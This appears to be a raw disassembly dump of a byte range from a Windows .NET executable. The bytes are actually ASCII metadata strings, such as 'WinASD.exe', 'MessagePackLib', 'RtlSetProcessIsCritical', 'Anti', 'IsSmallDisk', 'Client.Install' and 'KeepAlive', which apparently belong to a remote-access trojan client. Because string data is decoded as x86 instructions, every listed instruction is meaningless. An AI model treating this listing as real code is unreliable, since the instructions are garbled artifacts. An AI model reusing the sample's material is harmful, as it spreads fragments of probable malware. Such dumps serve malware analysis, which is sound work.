  4081f4:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  4081fb:	65 66 61             	gs popaw
  4081fe:	75 6c                	jne    0x40826c
  408200:	74 4d                	je     0x40824f
  408202:	65 6d                	gs insl (%dx),%es:(%edi)
  408204:	62 65 72             	bound  %esp,0x72(%ebp)
  408207:	41                   	inc    %ecx
  408208:	74 74                	je     0x40827e
  40820a:	72 69                	jb     0x408275
  40820c:	62 75 74             	bound  %esi,0x74(%ebp)
  40820f:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408213:	6d                   	insl   (%dx),%es:(%edi)
  408214:	70 69                	jo     0x40827f
  408216:	6c                   	insb   (%dx),%es:(%edi)
  408217:	61                   	popa
  408218:	74 69                	je     0x408283
  40821a:	6f                   	outsl  %ds:(%esi),(%dx)
  40821b:	6e                   	outsb  %ds:(%esi),(%dx)
  40821c:	52                   	push   %edx
  40821d:	65 6c                	gs insb (%dx),%es:(%edi)
  40821f:	61                   	popa
  408220:	78 61                	js     0x408283
  408222:	74 69                	je     0x40828d
  408224:	6f                   	outsl  %ds:(%esi),(%dx)
  408225:	6e                   	outsb  %ds:(%esi),(%dx)
  408226:	73 41                	jae    0x408269
  408228:	74 74                	je     0x40829e
  40822a:	72 69                	jb     0x408295
  40822c:	62 75 74             	bound  %esi,0x74(%ebp)
  40822f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408233:	73 65                	jae    0x40829a
  408235:	6d                   	insl   (%dx),%es:(%edi)
  408236:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  40823a:	72 6f                	jb     0x4082ab
  40823c:	64 75 63             	fs jne 0x4082a2
  40823f:	74 41                	je     0x408282
  408241:	74 74                	je     0x4082b7
  408243:	72 69                	jb     0x4082ae
  408245:	62 75 74             	bound  %esi,0x74(%ebp)
  408248:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40824c:	73 65                	jae    0x4082b3
  40824e:	6d                   	insl   (%dx),%es:(%edi)
  40824f:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408253:	6f                   	outsl  %ds:(%esi),(%dx)
  408254:	70 79                	jo     0x4082cf
  408256:	72 69                	jb     0x4082c1
  408258:	67 68 74 41 74 74    	addr16 push $0x74744174
  40825e:	72 69                	jb     0x4082c9
  408260:	62 75 74             	bound  %esi,0x74(%ebp)
  408263:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408267:	73 65                	jae    0x4082ce
  408269:	6d                   	insl   (%dx),%es:(%edi)
  40826a:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40826e:	6f                   	outsl  %ds:(%esi),(%dx)
  40826f:	6d                   	insl   (%dx),%es:(%edi)
  408270:	70 61                	jo     0x4082d3
  408272:	6e                   	outsb  %ds:(%esi),(%dx)
  408273:	79 41                	jns    0x4082b6
  408275:	74 74                	je     0x4082eb
  408277:	72 69                	jb     0x4082e2
  408279:	62 75 74             	bound  %esi,0x74(%ebp)
  40827c:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408280:	6e                   	outsb  %ds:(%esi),(%dx)
  408281:	74 69                	je     0x4082ec
  408283:	6d                   	insl   (%dx),%es:(%edi)
  408284:	65 43                	gs inc %ebx
  408286:	6f                   	outsl  %ds:(%esi),(%dx)
  408287:	6d                   	insl   (%dx),%es:(%edi)
  408288:	70 61                	jo     0x4082eb
  40828a:	74 69                	je     0x4082f5
  40828c:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  40828f:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  408296:	69 
  408297:	62 75 74             	bound  %esi,0x74(%ebp)
  40829a:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40829e:	74 5f                	je     0x4082ff
  4082a0:	55                   	push   %ebp
  4082a1:	73 65                	jae    0x408308
  4082a3:	53                   	push   %ebx
  4082a4:	68 65 6c 6c 45       	push   $0x456c6c65
  4082a9:	78 65                	js     0x408310
  4082ab:	63 75 74             	arpl   %esi,0x74(%ebp)
  4082ae:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4082b2:	61                   	popa
  4082b3:	64 42                	fs inc %edx
  4082b5:	79 74                	jns    0x40832b
  4082b7:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4082bb:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  4082c2:	00 
  4082c3:	44                   	inc    %esp
  4082c4:	65 6c                	gs insb (%dx),%es:(%edi)
  4082c6:	65 74 65             	gs je  0x40832e
  4082c9:	56                   	push   %esi
  4082ca:	61                   	popa
  4082cb:	6c                   	insb   (%dx),%es:(%edi)
  4082cc:	75 65                	jne    0x408333
  4082ce:	00 69 6e             	add    %ch,0x6e(%ecx)
  4082d1:	6e                   	outsb  %ds:(%esi),(%dx)
  4082d2:	65 72 56             	gs jb  0x40832b
  4082d5:	61                   	popa
  4082d6:	6c                   	insb   (%dx),%es:(%edi)
  4082d7:	75 65                	jne    0x40833e
  4082d9:	00 47 65             	add    %al,0x65(%edi)
  4082dc:	74 56                	je     0x408334
  4082de:	61                   	popa
  4082df:	6c                   	insb   (%dx),%es:(%edi)
  4082e0:	75 65                	jne    0x408347
  4082e2:	00 53 65             	add    %dl,0x65(%ebx)
  4082e5:	74 56                	je     0x40833d
  4082e7:	61                   	popa
  4082e8:	6c                   	insb   (%dx),%es:(%edi)
  4082e9:	75 65                	jne    0x408350
  4082eb:	00 76 61             	add    %dh,0x61(%esi)
  4082ee:	6c                   	insb   (%dx),%es:(%edi)
  4082ef:	75 65                	jne    0x408356
  4082f1:	00 67 65             	add    %ah,0x65(%edi)
  4082f4:	74 5f                	je     0x408355
  4082f6:	4b                   	dec    %ebx
  4082f7:	65 65 70 41          	gs gs jo 0x40833c
  4082fb:	6c                   	insb   (%dx),%es:(%edi)
  4082fc:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  408303:	5f                   	pop    %edi
  408304:	4b                   	dec    %ebx
  408305:	65 65 70 41          	gs gs jo 0x40834a
  408309:	6c                   	insb   (%dx),%es:(%edi)
  40830a:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  408311:	6f                   	outsl  %ds:(%esi),(%dx)
  408312:	76 65                	jbe    0x408379
  408314:	00 57 69             	add    %dl,0x69(%edi)
  408317:	6e                   	outsb  %ds:(%esi),(%dx)
  408318:	41                   	inc    %ecx
  408319:	53                   	push   %ebx
  40831a:	44                   	inc    %esp
  40831b:	2e 65 78 65          	cs js,pn 0x408384
  40831f:	00 73 65             	add    %dh,0x65(%ebx)
  408322:	74 5f                	je     0x408383
  408324:	42                   	inc    %edx
  408325:	6c                   	insb   (%dx),%es:(%edi)
  408326:	6f                   	outsl  %ds:(%esi),(%dx)
  408327:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  40832a:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408331:	5f                   	pop    %edi
  408332:	54                   	push   %esp
  408333:	6f                   	outsl  %ds:(%esi),(%dx)
  408334:	74 61                	je     0x408397
  408336:	6c                   	insb   (%dx),%es:(%edi)
  408337:	53                   	push   %ebx
  408338:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  40833f:	5f                   	pop    %edi
  408340:	48                   	dec    %eax
  408341:	65 61                	gs popa
  408343:	64 65 72 53          	fs gs jb 0x40839a
  408347:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40834e:	5f                   	pop    %edi
  40834f:	48                   	dec    %eax
  408350:	65 61                	gs popa
  408352:	64 65 72 53          	fs gs jb 0x4083a9
  408356:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40835d:	5f                   	pop    %edi
  40835e:	53                   	push   %ebx
  40835f:	65 6e                	outsb  %gs:(%esi),(%dx)
  408361:	64 42                	fs inc %edx
  408363:	75 66                	jne    0x4083cb
  408365:	66 65 72 53          	data16 gs jb 0x4083bc
  408369:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408370:	5f                   	pop    %edi
  408371:	52                   	push   %edx
  408372:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408376:	76 65                	jbe    0x4083dd
  408378:	42                   	inc    %edx
  408379:	75 66                	jne    0x4083e1
  40837b:	66 65 72 53          	data16 gs jb 0x4083d2
  40837f:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408386:	5f                   	pop    %edi
  408387:	4b                   	dec    %ebx
  408388:	65 79 53             	gs jns 0x4083de
  40838b:	69 7a 65 00 49 6e 64 	imul   $0x646e4900,0x65(%edx),%edi
  408392:	65 78 4f             	gs js  0x4083e4
  408395:	66 00 73 74          	data16 add %dh,0x74(%ebx)
  408399:	72 46                	jb     0x4083e1
  40839b:	6c                   	insb   (%dx),%es:(%edi)
  40839c:	61                   	popa
  40839d:	67 00 43 72          	add    %al,0x72(%bp,%di)
  4083a1:	79 70                	jns    0x408413
  4083a3:	74 6f                	je     0x408414
  4083a5:	43                   	inc    %ebx
  4083a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4083a7:	6e                   	outsb  %ds:(%esi),(%dx)
  4083a8:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  4083ae:	74 5f                	je     0x40840f
  4083b0:	50                   	push   %eax
  4083b1:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083b8:	5f                   	pop    %edi
  4083b9:	50                   	push   %eax
  4083ba:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  4083c1:	74 65                	je     0x408428
  4083c3:	6d                   	insl   (%dx),%es:(%edi)
  4083c4:	2e 54                	cs push %esp
  4083c6:	68 72 65 61 64       	push   $0x64616572
  4083cb:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083d2:	5f                   	pop    %edi
  4083d3:	50                   	push   %eax
  4083d4:	61                   	popa
  4083d5:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  4083dc:	64 64 
  4083de:	5f                   	pop    %edi
  4083df:	53                   	push   %ebx
  4083e0:	65 73 73             	gs jae 0x408456
  4083e3:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4083ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4083eb:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4083ef:	73 74                	jae    0x408465
  4083f1:	65 6d                	gs insl (%dx),%es:(%edi)
  4083f3:	45                   	inc    %ebp
  4083f4:	76 65                	jbe    0x40845b
  4083f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4083f7:	74 73                	je     0x40846c
  4083f9:	5f                   	pop    %edi
  4083fa:	53                   	push   %ebx
  4083fb:	65 73 73             	gs jae 0x408471
  4083fe:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408405:	6e                   	outsb  %ds:(%esi),(%dx)
  408406:	67 00 55 54          	add    %dl,0x54(%di)
  40840a:	46                   	inc    %esi
  40840b:	38 45 6e             	cmp    %al,0x6e(%ebp)
  40840e:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408411:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408418:	74 65                	je     0x40847f
  40841a:	6d                   	insl   (%dx),%es:(%edi)
  40841b:	2e 44                	cs inc %esp
  40841d:	72 61                	jb     0x408480
  40841f:	77 69                	ja     0x40848a
  408421:	6e                   	outsb  %ds:(%esi),(%dx)
  408422:	67 2e 49             	addr16 cs dec %ecx
  408425:	6d                   	insl   (%dx),%es:(%edi)
  408426:	61                   	popa
  408427:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  40842e:	73 
  40842f:	74 65                	je     0x408496
  408431:	6d                   	insl   (%dx),%es:(%edi)
  408432:	2e 52                	cs push %edx
  408434:	75 6e                	jne    0x4084a4
  408436:	74 69                	je     0x4084a1
  408438:	6d                   	insl   (%dx),%es:(%edi)
  408439:	65 2e 56             	gs cs push %esi
  40843c:	65 72 73             	gs jb  0x4084b2
  40843f:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  408446:	46                   	inc    %esi
  408447:	72 6f                	jb     0x4084b8
  408449:	6d                   	insl   (%dx),%es:(%edi)
  40844a:	42                   	inc    %edx
  40844b:	61                   	popa
  40844c:	73 65                	jae    0x4084b3
  40844e:	36 34 53             	ss xor $0x53,%al
  408451:	74 72                	je     0x4084c5
  408453:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  40845a:	61                   	popa
  40845b:	73 65                	jae    0x4084c2
  40845d:	36 34 53             	ss xor $0x53,%al
  408460:	74 72                	je     0x4084d4
  408462:	69 6e 67 00 52 65 61 	imul   $0x61655200,0x67(%esi),%ebp
  408469:	64 53                	fs push %ebx
  40846b:	74 72                	je     0x4084df
  40846d:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  408474:	6e                   	outsb  %ds:(%esi),(%dx)
  408475:	6c                   	insb   (%dx),%es:(%edi)
  408476:	6f                   	outsl  %ds:(%esi),(%dx)
  408477:	61                   	popa
  408478:	64 53                	fs push %ebx
  40847a:	74 72                	je     0x4084ee
  40847c:	69 6e 67 00 57 72 69 	imul   $0x69725700,0x67(%esi),%ebp
  408483:	74 65                	je     0x4084ea
  408485:	53                   	push   %ebx
  408486:	74 72                	je     0x4084fa
  408488:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  40848f:	74 72                	je     0x408503
  408491:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408498:	5f                   	pop    %edi
  408499:	41                   	inc    %ecx
  40849a:	73 53                	jae    0x4084ef
  40849c:	74 72                	je     0x408510
  40849e:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4084a5:	5f                   	pop    %edi
  4084a6:	41                   	inc    %ecx
  4084a7:	73 53                	jae    0x4084fc
  4084a9:	74 72                	je     0x40851d
  4084ab:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084b2:	65 73 41             	gs jae 0x4084f6
  4084b5:	73 53                	jae    0x40850a
  4084b7:	74 72                	je     0x40852b
  4084b9:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084c0:	41                   	inc    %ecx
  4084c1:	73 53                	jae    0x408516
  4084c3:	74 72                	je     0x408537
  4084c5:	69 6e 67 00 53 65 74 	imul   $0x74655300,0x67(%esi),%ebp
  4084cc:	41                   	inc    %ecx
  4084cd:	73 53                	jae    0x408522
  4084cf:	74 72                	je     0x408543
  4084d1:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084d8:	53                   	push   %ebx
  4084d9:	74 72                	je     0x40854d
  4084db:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084e2:	65 73 41             	gs jae 0x408526
  4084e5:	73 48                	jae    0x40852f
  4084e7:	65 78 53             	gs js  0x40853d
  4084ea:	74 72                	je     0x40855e
  4084ec:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  4084f3:	73 74                	jae    0x408569
  4084f5:	72 69                	jb     0x408560
  4084f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4084f8:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4084fc:	73 74                	jae    0x408572
  4084fe:	65 6d                	gs insl (%dx),%es:(%edi)
  408500:	2e 44                	cs inc %esp
  408502:	72 61                	jb     0x408565
  408504:	77 69                	ja     0x40856f
  408506:	6e                   	outsb  %ds:(%esi),(%dx)
  408507:	67 00 67 65          	add    %ah,0x65(%bx)
  40850b:	74 5f                	je     0x40856c
  40850d:	41                   	inc    %ecx
  40850e:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408512:	61                   	popa
  408513:	74 65                	je     0x40857a
  408515:	50                   	push   %eax
  408516:	6f                   	outsl  %ds:(%esi),(%dx)
  408517:	6e                   	outsb  %ds:(%esi),(%dx)
  408518:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  40851c:	74 5f                	je     0x40857d
  40851e:	41                   	inc    %ecx
  40851f:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408523:	61                   	popa
  408524:	74 65                	je     0x40858b
  408526:	50                   	push   %eax
  408527:	6f                   	outsl  %ds:(%esi),(%dx)
  408528:	6e                   	outsb  %ds:(%esi),(%dx)
  408529:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  40852d:	74 5f                	je     0x40858e
  40852f:	45                   	inc    %ebp
  408530:	72 72                	jb     0x4085a4
  408532:	6f                   	outsl  %ds:(%esi),(%dx)
  408533:	72 44                	jb     0x408579
  408535:	69 61 6c 6f 67 00 6d 	imul   $0x6d00676f,0x6c(%ecx),%esp
  40853c:	73 67                	jae    0x4085a5
  40853e:	00 43 6f             	add    %al,0x6f(%ebx)
  408541:	6d                   	insl   (%dx),%es:(%edi)
  408542:	70 75                	jo     0x4085b9
  408544:	74 65                	je     0x4085ab
  408546:	48                   	dec    %eax
  408547:	61                   	popa
  408548:	73 68                	jae    0x4085b2
  40854a:	00 73 74             	add    %dh,0x74(%ebx)
  40854d:	72 54                	jb     0x4085a3
  40854f:	6f                   	outsl  %ds:(%esi),(%dx)
  408550:	48                   	dec    %eax
  408551:	61                   	popa
  408552:	73 68                	jae    0x4085bc
  408554:	00 47 65             	add    %al,0x65(%edi)
  408557:	74 48                	je     0x4085a1
  408559:	61                   	popa
  40855a:	73 68                	jae    0x4085c4
  40855c:	00 56 65             	add    %dl,0x65(%esi)
  40855f:	72 69                	jb     0x4085ca
  408561:	66 79 48             	data16 jns 0x4085ac
  408564:	61                   	popa
  408565:	73 68                	jae    0x4085cf
  408567:	00 46 6c             	add    %al,0x6c(%esi)
  40856a:	75 73                	jne    0x4085df
  40856c:	68 00 67 65 74       	push   $0x74656700
  408571:	5f                   	pop    %edi
  408572:	45                   	inc    %ebp
  408573:	78 65                	js     0x4085da
  408575:	63 75 74             	arpl   %esi,0x74(%ebp)
  408578:	61                   	popa
  408579:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  40857d:	61                   	popa
  40857e:	74 68                	je     0x4085e8
  408580:	00 47 65             	add    %al,0x65(%edi)
  408583:	74 54                	je     0x4085d9
  408585:	65 6d                	gs insl (%dx),%es:(%edi)
  408587:	70 50                	jo     0x4085d9
  408589:	61                   	popa
  40858a:	74 68                	je     0x4085f4
  40858c:	00 70 61             	add    %dh,0x61(%eax)
  40858f:	74 68                	je     0x4085f9
  408591:	00 48 6d             	add    %cl,0x6d(%eax)
  408594:	61                   	popa
  408595:	63 53 68             	arpl   %edx,0x68(%ebx)
  408598:	61                   	popa
  408599:	32 35 36 4c 65 6e    	xor    0x6e654c36,%dh
  40859f:	67 74 68             	addr16 je 0x40860a
  4085a2:	00 67 65             	add    %ah,0x65(%edi)
  4085a5:	74 5f                	je     0x408606
  4085a7:	4c                   	dec    %esp
  4085a8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085aa:	67 74 68             	addr16 je 0x408615
  4085ad:	00 49 76             	add    %cl,0x76(%ecx)
  4085b0:	4c                   	dec    %esp
  4085b1:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085b3:	67 74 68             	addr16 je 0x40861e
  4085b6:	00 41 75             	add    %al,0x75(%ecx)
  4085b9:	74 68                	je     0x408623
  4085bb:	4b                   	dec    %ebx
  4085bc:	65 79 4c             	gs jns 0x40860b
  4085bf:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085c1:	67 74 68             	addr16 je 0x40862c
  4085c4:	00 55 72             	add    %dl,0x72(%ebp)
  4085c7:	69 00 41 6e 74 69    	imul   $0x69746e41,(%eax),%eax
  4085cd:	00 6d 73             	add    %ch,0x73(%ebp)
  4085d0:	67 70 61             	addr16 jo 0x408634
  4085d3:	63 6b 4f             	arpl   %ebp,0x4f(%ebx)
  4085d6:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085d9:	6c                   	insb   (%dx),%es:(%edi)
  4085da:	69 73 74 4f 62 6a 00 	imul   $0x6a624f,0x74(%ebx),%esi
  4085e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4085e2:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085e5:	4d                   	dec    %ebp
  4085e6:	65 73 73             	gs jae 0x40865c
  4085e9:	61                   	popa
  4085ea:	67 65 50             	addr16 gs push %eax
  4085ed:	61                   	popa
  4085ee:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  4085f1:	69 62 2e 4d 65 73 73 	imul   $0x7373654d,0x2e(%edx),%esp
  4085f8:	61                   	popa
  4085f9:	67 65 50             	addr16 gs push %eax
  4085fc:	61                   	popa
  4085fd:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408600:	4d                   	dec    %ebp
  408601:	73 67                	jae    0x40866a
  408603:	50                   	push   %eax
  408604:	61                   	popa
  408605:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408608:	41                   	inc    %ecx
  408609:	73 79                	jae    0x408684
  40860b:	6e                   	outsb  %ds:(%esi),(%dx)
  40860c:	63 43 61             	arpl   %eax,0x61(%ebx)
  40860f:	6c                   	insb   (%dx),%es:(%edi)
  408610:	6c                   	insb   (%dx),%es:(%edi)
  408611:	62 61 63             	bound  %esp,0x63(%ecx)
  408614:	6b 00 52             	imul   $0x52,(%eax),%eax
  408617:	65 6d                	gs insl (%dx),%es:(%edi)
  408619:	6f                   	outsl  %ds:(%esi),(%dx)
  40861a:	74 65                	je     0x408681
  40861c:	43                   	inc    %ebx
  40861d:	65 72 74             	gs jb  0x408694
  408620:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408627:	56                   	push   %esi
  408628:	61                   	popa
  408629:	6c                   	insb   (%dx),%es:(%edi)
  40862a:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  408631:	43 
  408632:	61                   	popa
  408633:	6c                   	insb   (%dx),%es:(%edi)
  408634:	6c                   	insb   (%dx),%es:(%edi)
  408635:	62 61 63             	bound  %esp,0x63(%ecx)
  408638:	6b 00 54             	imul   $0x54,(%eax),%eax
  40863b:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408642:	6c                   	insb   (%dx),%es:(%edi)
  408643:	62 61 63             	bound  %esp,0x63(%ecx)
  408646:	6b 00 75             	imul   $0x75,(%eax),%eax
  408649:	6e                   	outsb  %ds:(%esi),(%dx)
  40864a:	70 61                	jo     0x4086ad
  40864c:	63 6b 5f             	arpl   %ebp,0x5f(%ebx)
  40864f:	6d                   	insl   (%dx),%es:(%edi)
  408650:	73 67                	jae    0x4086b9
  408652:	70 61                	jo     0x4086b5
  408654:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408657:	52                   	push   %edx
  408658:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  40865f:	4b 65 
  408661:	79 50                	jns    0x4086b3
  408663:	65 72 6d             	gs jb  0x4086d3
  408666:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  40866d:	68 65 63 6b 00       	push   $0x6b6365
  408672:	46                   	inc    %esi
  408673:	6c                   	insb   (%dx),%es:(%edi)
  408674:	75 73                	jne    0x4086e9
  408676:	68 46 69 6e 61       	push   $0x616e6946
  40867b:	6c                   	insb   (%dx),%es:(%edi)
  40867c:	42                   	inc    %edx
  40867d:	6c                   	insb   (%dx),%es:(%edi)
  40867e:	6f                   	outsl  %ds:(%esi),(%dx)
  40867f:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408682:	49                   	dec    %ecx
  408683:	73 53                	jae    0x4086d8
  408685:	6d                   	insl   (%dx),%es:(%edi)
  408686:	61                   	popa
  408687:	6c                   	insb   (%dx),%es:(%edi)
  408688:	6c                   	insb   (%dx),%es:(%edi)
  408689:	44                   	inc    %esp
  40868a:	69 73 6b 00 62 56 61 	imul   $0x61566200,0x6b(%ebx),%esi
  408691:	6c                   	insb   (%dx),%es:(%edi)
  408692:	00 66 56             	add    %ah,0x56(%esi)
  408695:	61                   	popa
  408696:	6c                   	insb   (%dx),%es:(%edi)
  408697:	00 69 56             	add    %ch,0x56(%ecx)
  40869a:	61                   	popa
  40869b:	6c                   	insb   (%dx),%es:(%edi)
  40869c:	00 73 74             	add    %dh,0x74(%ebx)
  40869f:	72 56                	jb     0x4086f7
  4086a1:	61                   	popa
  4086a2:	6c                   	insb   (%dx),%es:(%edi)
  4086a3:	00 52 74             	add    %dl,0x74(%edx)
  4086a6:	6c                   	insb   (%dx),%es:(%edi)
  4086a7:	53                   	push   %ebx
  4086a8:	65 74 50             	gs je  0x4086fb
  4086ab:	72 6f                	jb     0x40871c
  4086ad:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086b0:	73 49                	jae    0x4086fb
  4086b2:	73 43                	jae    0x4086f7
  4086b4:	72 69                	jb     0x40871f
  4086b6:	74 69                	je     0x408721
  4086b8:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086bb:	00 50 72             	add    %dl,0x72(%eax)
  4086be:	6f                   	outsl  %ds:(%esi),(%dx)
  4086bf:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086c2:	73 43                	jae    0x408707
  4086c4:	72 69                	jb     0x40872f
  4086c6:	74 69                	je     0x408731
  4086c8:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086cb:	00 4e 65             	add    %cl,0x65(%esi)
  4086ce:	74 77                	je     0x408747
  4086d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4086d1:	72 6b                	jb     0x40873e
  4086d3:	43                   	inc    %ebx
  4086d4:	72 65                	jb     0x40873b
  4086d6:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4086d9:	74 69                	je     0x408744
  4086db:	61                   	popa
  4086dc:	6c                   	insb   (%dx),%es:(%edi)
  4086dd:	00 53 79             	add    %dl,0x79(%ebx)
  4086e0:	73 74                	jae    0x408756
  4086e2:	65 6d                	gs insl (%dx),%es:(%edi)
  4086e4:	2e 53                	cs push %ebx
  4086e6:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4086ea:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  4086f1:	6e 
  4086f2:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4086f5:	61                   	popa
  4086f6:	6c                   	insb   (%dx),%es:(%edi)
  4086f7:	00 57 69             	add    %dl,0x69(%edi)
  4086fa:	6e                   	outsb  %ds:(%esi),(%dx)
  4086fb:	64 6f                	outsl  %fs:(%esi),(%dx)
  4086fd:	77 73                	ja     0x408772
  4086ff:	50                   	push   %eax
  408700:	72 69                	jb     0x40876b
  408702:	6e                   	outsb  %ds:(%esi),(%dx)
  408703:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408706:	61                   	popa
  408707:	6c                   	insb   (%dx),%es:(%edi)
  408708:	00 41 72             	add    %al,0x72(%ecx)
  40870b:	65 45                	gs inc %ebp
  40870d:	71 75                	jno    0x408784
  40870f:	61                   	popa
  408710:	6c                   	insb   (%dx),%es:(%edi)
  408711:	00 67 65             	add    %ah,0x65(%edi)
  408714:	74 5f                	je     0x408775
  408716:	49                   	dec    %ecx
  408717:	6e                   	outsb  %ds:(%esi),(%dx)
  408718:	74 65                	je     0x40877f
  40871a:	72 76                	jb     0x408792
  40871c:	61                   	popa
  40871d:	6c                   	insb   (%dx),%es:(%edi)
  40871e:	00 73 65             	add    %dh,0x65(%ebx)
  408721:	74 5f                	je     0x408782
  408723:	49                   	dec    %ecx
  408724:	6e                   	outsb  %ds:(%esi),(%dx)
  408725:	74 65                	je     0x40878c
  408727:	72 76                	jb     0x40879f
  408729:	61                   	popa
  40872a:	6c                   	insb   (%dx),%es:(%edi)
  40872b:	00 43 6c             	add    %al,0x6c(%ebx)
  40872e:	69 65 6e 74 2e 49 6e 	imul   $0x6e492e74,0x6e(%ebp),%esp
  408735:	73 74                	jae    0x4087ab
  408737:	61                   	popa
  408738:	6c                   	insb   (%dx),%es:(%edi)
  408739:	6c                   	insb   (%dx),%es:(%edi)
  40873a:	00 6b 65             	add    %ch,0x65(%ebx)
  40873d:	72 6e                	jb     0x4087ad
  40873f:	65 6c                	gs insb (%dx),%es:(%edi)
  408741:	33 32                	xor    (%edx),%esi
  408743:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408746:	6c                   	insb   (%dx),%es:(%edi)
  408747:	00 75 73             	add    %dh,0x73(%ebp)
  40874a:	65 72 33             	gs jb  0x408780
  40874d:	32 2e                	xor    (%esi),%ch
  40874f:	64 6c                	fs insb (%dx),%es:(%edi)
  408751:	6c                   	insb   (%dx),%es:(%edi)
  408752:	00 6e 74             	add    %ch,0x74(%esi)
  408755:	64 6c                	fs insb (%dx),%es:(%edi)
  408757:	6c                   	insb   (%dx),%es:(%edi)
  408758:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40875b:	6c                   	insb   (%dx),%es:(%edi)
  40875c:	00 4b 69             	add    %cl,0x69(%ebx)
  40875f:	6c                   	insb   (%dx),%es:(%edi)
  408760:	6c                   	insb   (%dx),%es:(%edi)
  408761:	00 50 6f             	add    %dl,0x6f(%eax)
  408764:	6c                   	insb   (%dx),%es:(%edi)
  408765:	6c                   	insb   (%dx),%es:(%edi)
